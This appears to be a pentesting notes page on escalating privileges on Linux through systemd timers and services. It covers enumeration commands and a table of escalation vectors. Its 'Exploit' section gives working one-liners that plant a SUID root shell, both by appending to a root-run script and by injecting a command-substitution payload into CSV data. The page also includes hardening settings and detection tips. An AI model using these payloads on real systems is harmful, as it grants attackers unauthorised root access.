---
topic: systemd
platform: Linux
tags: [linux, privesc, systemd, timer]
---

# systemd timers and privileges

**English** | [🇪🇸 Español](systemd-timers.md)

> The "modern cron". Many writeups miss it because `crontab -l` is empty.

## Enumerate

```bash
systemctl list-timers --all
systemctl list-units --type=service --state=running
systemctl list-timers --all | awk '{print $NF}' | grep -E '\.timer$' | xargs -r systemctl cat
ls -l /etc/systemd/system/ /lib/systemd/system/ /run/systemd/system/
find / -name '*.timer' -o -name '*.service' 2>/dev/null | grep -v -E '^/(usr|lib/systemd)'
```

`systemctl cat <unit>` is the key: it prints the file, its overrides and the real `ExecStart`.

```bash
systemctl cat <unit>.service
systemctl show -p ExecStart,User,Environment <unit>.service
```

`crontab` intuitions do not apply: a timer can fire every minute without appearing in `/etc/cron*`.

## Escalation vectors

| Vector | What to look at |
|---|---|
| Writable unit file | `ls -l` on the `.service`/`.timer` and its `*.d/*.conf` |
| Writable `ExecStart` | the script/binary root runs |
| Attacker-controlled data | the script reads a file/DB/queue you can write |
| Writable `EnvironmentFile` | change variables root relies on |
| Relative `PATH` | `ExecStart=run.sh` without an absolute path → hijack in the working dir |
| Missing `ProtectSystem`/`ProtectHome` | writes to system paths |
| Missing `User=` | the unit runs as root |

### The most profitable pattern

A script running as root that consumes **data you control**: a CSV, a table, a Kafka message, a file in `/opt`. The script need not be writable; it is enough that it `eval`s or interprets your content.

```bash
systemctl list-timers --all | grep -i <hint>
cat /opt/app/worker.sh          # how does it process input?
ls -l /opt/app/data/
```

If you also hold a file-writing service (ClickHouse, MySQL `INTO OUTFILE`, Redis `CONFIG SET dir`), you can **overwrite the script** instead of waiting for it to read your data.

### Probing a timer

```bash
inotifywait -m -e create,modify /opt/app/data/
date; ls -la /tmp/rootbash 2>/dev/null    # wait for the tick
```

## Exploit

```bash
# if the script is writable
echo 'chmod 4755 /bin/bash' >> /opt/app/worker.sh && /bin/bash -p

# otherwise, inject into the data it processes (eval over CSV)
# x[$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)],45,20
```

## Harden

```ini
[Service]
User=app
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
ReadWritePaths=/var/lib/app
```

- Units and scripts `root:root 0755`, not writable by group or others.
- `ExecStart` always with an absolute path.
- Validate the content privileged scripts process (no `eval`).

## Detection

- mtime changes on `.service`/`.timer` and their `ExecStart` (audit `-w /etc/systemd/system -p wa`).
- Unexpected `systemctl daemon-reload`.
- New SUID files in `/tmp` every few minutes.

## References

- <https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html>
- <https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html>
- <https://gtfobins.github.io/>
